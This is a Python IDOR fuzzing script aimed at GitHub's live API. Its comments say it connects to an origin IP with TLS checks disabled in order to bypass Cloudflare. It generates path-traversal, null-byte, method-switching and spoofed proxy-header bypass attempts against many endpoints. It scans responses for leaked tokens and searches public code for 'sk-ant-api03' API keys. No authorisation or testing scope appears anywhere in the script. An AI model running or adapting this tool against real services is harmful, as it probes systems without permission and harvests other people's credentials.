#!/usr/bin/env python3
"""
github-idor.py — IDOR fuzzer applying bypass techniques to GitHub API endpoints.
Connects directly to origin IP (140.82.112.6) to bypass Cloudflare.

Techniques (same engine as anthropic-idor.py):
1.  Trailing symbols      6.  Sub-path variants      11. Object param pollution
2.  Trailing slash         7.  HTTP Parameter Pollution
3.  Double slash           8.  JSON array injection
4.  Dot tricks             9.  Bracket notation
5.  API version downgrade  10. Leading zeros / wildcards
12. Method switching       13. Proxy headers
"""
import requests
import json
import re
import time
import os
import sys
from urllib.parse import urlencode, urlparse

# Origin IP bypass — connect to GitHub directly, bypassing Cloudflare
ORIGIN_IP = "140.82.112.6"
HOST = "api.github.com"
BASE_URL = f"https://{ORIGIN_IP}"

OUTPUT_DIR = "/tmp/github-idor"
os.makedirs(OUTPUT_DIR, exist_ok=True)

FINDINGS = []
ALL_RESULTS = []

# Session with Host header override
def make_session():
    s = requests.Session()
    s.headers.update({
        "Host": HOST,
        "User-Agent": "github-idor-fuzzer/1.0",
        "Accept": "application/vnd.github+json",
        "Accept-Encoding": "gzip, deflate",
    })
    # Disable SSL verification for origin IP (SNI mismatch)
    s.verify = False
    # Suppress SSL warnings
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    return s

# ---------------------------------------------------------------------------
# TARGET ENDPOINTS — GitHub API
# ---------------------------------------------------------------------------
TARGETS = [
    # Public endpoints (no auth needed)
    {"name": "api-root", "method": "GET", "path": "/", "query": {}, "body": None},
    {"name": "rate-limit", "method": "GET", "path": "/rate_limit", "query": {}, "body": None},
    {"name": "meta", "method": "GET", "path": "/meta", "query": {}, "body": None},
    {"name": "feeds", "method": "GET", "path": "/feeds", "query": {}, "body": None},
    {"name": "emojis", "method": "GET", "path": "/emojis", "query": {}, "body": None},
    {"name": "events", "method": "GET", "path": "/events", "query": {}, "body": None},
    {"name": "repositories", "method": "GET", "path": "/repositories", "query": {}, "body": None},
    {"name": "zen", "method": "GET", "path": "/zen", "query": {}, "body": None},
    {"name": "gitignore-templates", "method": "GET", "path": "/gitignore/templates", "query": {}, "body": None},
    
    # User endpoints
    {"name": "user-octocat", "method": "GET", "path": "/users/octocat", "query": {}, "body": None},
    {"name": "user-github", "method": "GET", "path": "/users/github", "query": {}, "body": None},
    {"name": "users", "method": "GET", "path": "/users", "query": {}, "body": None},
    
    # Org endpoints
    {"name": "org-github", "method": "GET", "path": "/orgs/github", "query": {}, "body": None},
    {"name": "org-google", "method": "GET", "path": "/orgs/google", "query": {}, "body": None},
    {"name": "org-microsoft", "method": "GET", "path": "/orgs/microsoft", "query": {}, "body": None},
    {"name": "organizations", "method": "GET", "path": "/organizations", "query": {}, "body": None},
    
    # Repo endpoints
    {"name": "repo-octocat", "method": "GET", "path": "/repos/octocat/Hello-World", "query": {}, "body": None},
    {"name": "repo-torvalds", "method": "GET", "path": "/repos/torvalds/linux", "query": {}, "body": None},
    
    # Search endpoints
    {"name": "search-repos", "method": "GET", "path": "/search/repositories", "query": {"q": "language:python", "per_page": "1"}, "body": None},
    {"name": "search-code", "method": "GET", "path": "/search/code", "query": {"q": "sk-ant-api03"}, "body": None},
    {"name": "search-users", "method": "GET", "path": "/search/users", "query": {"q": "octocat"}, "body": None},
    
    # Auth-required (baseline: should 401)
    {"name": "user-auth", "method": "GET", "path": "/user", "query": {}, "body": None},
    {"name": "user-emails", "method": "GET", "path": "/user/emails", "query": {}, "body": None},
    {"name": "user-keys", "method": "GET", "path": "/user/keys", "query": {}, "body": None},
    {"name": "notifications", "method": "GET", "path": "/notifications", "query": {}, "body": None},
    {"name": "gists", "method": "GET", "path": "/gists", "query": {}, "body": None},
    {"name": "issues", "method": "GET", "path": "/issues", "query": {}, "body": None},
    
    # Interesting internal-ish endpoints
    {"name": "marketplace-listings", "method": "GET", "path": "/marketplace_listing/plans", "query": {}, "body": None},
    {"name": "licenses", "method": "GET", "path": "/licenses", "query": {}, "body": None},
    {"name": "codes-of-conduct", "method": "GET", "path": "/codes_of_conduct", "query": {}, "body": None},
    {"name": "gitignore-templates-names", "method": "GET", "path": "/gitignore/templates/Python", "query": {}, "body": None},
    
    # GraphQL / v4 API
    {"name": "graphql", "method": "GET", "path": "/graphql", "query": {}, "body": None},
    
    # Gists (public)
    {"name": "gists-public", "method": "GET", "path": "/gists/public", "query": {}, "body": None},
    
    # Rate limit specific
    {"name": "rate-limit-specific", "method": "GET", "path": "/rate_limit", "query": {"t": str(int(time.time()))}, "body": None},
]

# ---------------------------------------------------------------------------
# BYPASS TECHNIQUE GENERATOR (same as anthropic-idor.py)
# ---------------------------------------------------------------------------
def generate_bypasses(target):
    """Generate all bypass variations for a target."""
    path = target["path"]
    query = target.get("query", {})
    body = target.get("body")
    suffix = target.get("suffix", "")
    full_path = path + suffix
    bypasses = []

    # 1. Trailing symbols
    for sym in [",", ";", ":", "|", "..", "...", "%00", "\\", "../", "..;/", "%0a", "%0d%0a", "?", "!", "@", "#", "$", "%", "^", "*", "(", ")", "[", "]", "{", "}", "<", ">", "~", "+", "-", "_", " ", "%20", "%09", "//"]:
        bypasses.append(("trailing-" + sym.replace("%", "pct").replace("\\", "bslash").replace("/", "fslash").replace(" ", "space")[:20], full_path + sym, query, body, None, None))

    # 2. Trailing slash
    if not full_path.endswith("/"):
        bypasses.append(("trailing-slash", full_path + "/", query, body, None, None))

    # 3. Double slash in path
    parts = full_path.split("/")
    for i in range(1, len(parts)):
        modified = parts[:i] + [""] + parts[i:]
        bypasses.append((f"double-slash-{i}", "/".join(modified), query, body, None, None))

    # 4. Dot tricks
    for i in range(2, len(parts)):
        modified = parts[:i] + [".", ""] + parts[i:]
        bypasses.append((f"dot-path-{i}", "/".join(modified), query, body, None, None))
    if len(parts) >= 4:
        modified = parts[:1] + [".."] + parts[2:]
        bypasses.append(("path-traversal", "/".join(modified), query, body, None, None))

    # 5. API version downgrade/upgrade
    v_match = re.match(r"^(/v)(\d+)(/.*)", full_path)
    if v_match:
        for v in range(1, 6):
            downgraded = f"{v_match.group(1)}{v}{v_match.group(3)}"
            if downgraded != full_path:
                bypasses.append((f"version-v{v}", downgraded, query, body, None, None))
    else:
        for v in range(1, 4):
            bypasses.append((f"version-prefix-v{v}", f"/api/v{v}{full_path}", query, body, None, None))

    # 6. Sub-path variants
    for sub in ["/details", "/info", "/status", "/metadata", "/data", "/config", "/admin", "/internal", "/debug", "/test", "/v1", "/v2", "/v3"]:
        bypasses.append((f"subpath-{sub.lstrip('/')}", full_path + sub, query, body, None, None))

    # 7. Query param pollution
    if query:
        for key in list(query.keys()):
            polluted = dict(query)
            polluted[key] = [query[key], "test"]
            bypasses.append((f"hpp-{key}-array", full_path, polluted, body, None, None))
            polluted2 = dict(query)
            polluted2[key.upper()] = "test"
            bypasses.append((f"hpp-{key}-case", full_path, polluted2, body, None, None))

    # 8. JSON array injection on body
    if body and isinstance(body, dict):
        for key in list(body.keys()):
            if isinstance(body[key], str):
                modified = dict(body)
                modified[key] = [body[key], "test"]
                bypasses.append((f"json-array-{key}", full_path, query, modified, None, None))
            elif isinstance(body[key], (int, float)):
                modified = dict(body)
                modified[key] = [body[key], 9]
                bypasses.append((f"json-array-int-{key}", full_path, query, modified, None, None))

    # 9. Common ID params
    for param_name in ["id", "user_id", "org_id", "organization_id", "email", "key", "token", "uuid", "code"]:
        bypasses.append((f"param-{param_name}", full_path, {**query, param_name: "test"}, body, None, None))

    # 10. Null byte
    bypasses.append(("null-byte", full_path + "%00", query, body, None, None))

    # 11. Method switching
    for alt in ["PUT", "PATCH", "DELETE", "OPTIONS", "HEAD"]:
        bypasses.append((f"method-{alt}", full_path, query, body, alt, None))

    # 12. Proxy headers
    for hdr_name, hdr_val in [("X-Original-URL", full_path), ("X-Forwarded-For", "127.0.0.1"), ("X-Forwarded-Host", "localhost"), ("X-Rewrite-URL", full_path)]:
        bypasses.append((f"proxy-{hdr_name}", full_path, query, body, None, {hdr_name: hdr_val}))

    # 13. Wildcards in query
    for key, val in query.items():
        if isinstance(val, str):
            bypasses.append((f"wildcard-{key}-pct", full_path, {**query, key: val + "%"}, body, None, None))
            bypasses.append((f"wildcard-{key}-star", full_path, {**query, key: val + "*"}, body, None, None))

    # 14. Brackets notation
    for key in list(query.keys()):
        bypasses.append((f"bracket-{key}", full_path, {f"{key}[]": query[key]}, body, None, None))
        bypasses.append((f"object-{key}", full_path, {f"{key}[user]": "test", f"{key}[admin]": "true"}, body, None, None))

    return bypasses


# ---------------------------------------------------------------------------
# MAIN
# ---------------------------------------------------------------------------
def main():
    global BASE_URL
    session = make_session()
    
    # Verify origin IP is accessible
    print("🌐 Testing origin IP connectivity to api.github.com at 140.82.112.6...")
    try:
        r = session.get(f"{BASE_URL}/", timeout=10)
        print(f"   Origin IP response: {r.status_code} | {r.text[:100].strip()}")
    except Exception as e:
        print(f"   ❌ Cannot reach origin IP: {e}")
        print("   Falling back to direct api.github.com (with Cloudflare)...")
        # Fallback: use direct hostname
        BASE_URL = "https://api.github.com"
        session = make_session()

    total_findings = 0
    total_tests = 0

    for target in TARGETS:
        name = target["name"]
        method = target["method"]
        path = target["path"]
        suffix = target.get("suffix", "")
        full_path = path + suffix

        print(f"\n{'='*60}")
        print(f"🎯 {name}: {method} {full_path}")
        print(f"{'='*60}")

        # Generate bypasses
        bypasses = generate_bypasses(target)
        print(f"   Testing {len(bypasses)} bypass variations...")
        total_tests += len(bypasses)

        # Get baseline
        baseline = {"status": 0, "body": "", "headers": {}}
        try:
            url = f"{BASE_URL}{full_path}"
            if target["body"]:
                r = session.request(method, url, json=target["body"], timeout=15)
            elif target["query"]:
                r = session.request(method, url, params=target["query"], timeout=15)
            else:
                r = session.request(method, url, timeout=15)
            baseline = {"status": r.status_code, "body": r.text[:500], "headers": dict(r.headers)}
            print(f"   Baseline: {r.status_code} | {r.text[:80].strip()}")
        except Exception as e:
            print(f"   Baseline error: {e}")
            baseline = {"status": 0, "body": str(e)[:200], "headers": {}}

        # Test all bypasses
        tested = 0
        for technique, bypass_path, bypass_query, bypass_body, bypass_method, bypass_headers in bypasses:
            method_to_use = bypass_method or method
            url = f"{BASE_URL}{bypass_path}"
            tested += 1
            
            if tested % 10 == 0:
                print(f"   ... {tested}/{len(bypasses)} tested ...")
            
            try:
                kwargs = {"timeout": 10}
                if bypass_body:
                    kwargs["json"] = bypass_body
                if bypass_query:
                    kwargs["params"] = bypass_query
                if bypass_headers:
                    kwargs["headers"] = bypass_headers

                r = session.request(method_to_use, url, **kwargs)
                status = r.status_code
                body = r.text[:500]
                headers = dict(r.headers)

                # Detect anomalies vs baseline
                b_status = baseline.get("status", 0)
                b_body = baseline.get("body", "")
                anomalies = []
                
                # Status code changes
                if status != b_status and b_status > 0:
                    if b_status >= 400 and status < 400:
                        anomalies.append(f"BYPASS {b_status}→{status}")
                    elif status == 500:
                        anomalies.append(f"CRASH→500")
                    elif b_status == 400 and status == 401:
                        pass  # Expected: different auth error isn't interesting
                    elif status == 405:
                        anomalies.append(f"EXISTS→405 (method exists)")
                    elif abs(status - b_status) >= 100:  # Large change
                        anomalies.append(f"CHANGE {b_status}→{status}")
                    else:
                        anomalies.append(f"minor {b_status}→{status}")

                # Body size anomalies (data leak?)
                if body and len(body) > 50 and len(b_body) > 50:
                    if abs(len(body) - len(b_body)) > 500:
                        anomalies.append(f"SIZE-DIFF {len(body)} vs {len(b_body)}")

                # Data leak keyword detection
                if body and len(body) > 30:
                    lower = body.lower()
                    for kw in ["token", "key", "secret", "password", "email", "admin", "internal", 
                               "private", "hidden", "credential", "apikey", "api_key", "session",
                               "access_token", "pat_", "ghp_", "github_pat_", "sk-ant"]:
                        if kw in lower and kw not in b_body.lower():
                            anomalies.append(f"DATA:{kw}")

                # Content-Type changes
                b_ct = baseline.get("headers", {}).get("Content-Type", "")
                ct = headers.get("Content-Type", "")
                if b_ct and ct and "json" in b_ct.lower() and "json" not in ct.lower():
                    anomalies.append(f"CT-SWITCH json→{ct[:40]}")

                # Cache header anomalies
                cache = headers.get("Cache-Control", "")
                if cache and "private" in cache:
                    anomalies.append("CACHE:private")

                if anomalies:
                    icon = "🔥" if any("BYPASS" in a or "DATA" in a for a in anomalies) else "⚠️"
                    print(f"   {icon} {technique:35s} → {status} | {'; '.join(anomalies)}")
                    if body and len(body) > 10 and "admin" not in body.lower():
                        print(f"      Body: {body[:150]}")
                    FINDINGS.append({
                        "target": name, "technique": technique, "url": url,
                        "method": method_to_use, "status": status,
                        "body": body[:300], "anomalies": anomalies
                    })
                    total_findings += 1

                ALL_RESULTS.append({"target": name, "technique": technique, "url": url, "status": status, "body": body[:200]})

            except Exception as e:
                ALL_RESULTS.append({"target": name, "technique": technique, "url": url, "status": 0, "body": str(e)[:200]})
                pass

            time.sleep(0.05)  # Rate limiting for GitHub

        print(f"   Done: {tested} tests | {total_findings} anomalies found so far")

    # Summary
    print(f"\n{'='*60}")
    print(f"📊 TOTAL: {total_findings} anomalies out of {total_tests} tests")
    print(f"{'='*60}")

    # Prioritize interesting findings
    byp = [f for f in FINDINGS if any("BYPASS" in a for a in f["anomalies"])]
    dat = [f for f in FINDINGS if any("DATA" in a for a in f["anomalies"])]
    
    print(f"\n🔥 BYPASS anomalies: {len(byp)}")
    for f in byp:
        print(f"   [{f['target']}] {f['technique']:30s} → {f['status']} | {'; '.join(f['anomalies'][:3])}")
    
    print(f"\n🔑 DATA leaks: {len(dat)}")
    for f in dat:
        print(f"   [{f['target']}] {f['technique']:30s} → {f['status']} | {'; '.join(f['anomalies'][:3])}")
        print(f"      Body excerpt: {f['body'][:150]}")

    # Save all
    with open(f"{OUTPUT_DIR}/findings.json", "w") as fp:
        json.dump(FINDINGS, fp, indent=2)
    with open(f"{OUTPUT_DIR}/all-results.json", "w") as fp:
        json.dump(ALL_RESULTS, fp, indent=2)
    with open(f"{OUTPUT_DIR}/bypasses.json", "w") as fp:
        json.dump(byp, fp, indent=2)
    with open(f"{OUTPUT_DIR}/data-leaks.json", "w") as fp:
        json.dump(dat, fp, indent=2)

    print(f"\n💾 Saved to {OUTPUT_DIR}/")
    print(f"   findings.json     — {len(FINDINGS)} anomalies")
    print(f"   bypasses.json     — {len(byp)} potential bypasses")
    print(f"   data-leaks.json   — {len(dat)} data leaks")
    print(f"   all-results.json  — {len(ALL_RESULTS)} total results")

if __name__ == "__main__":
    main()
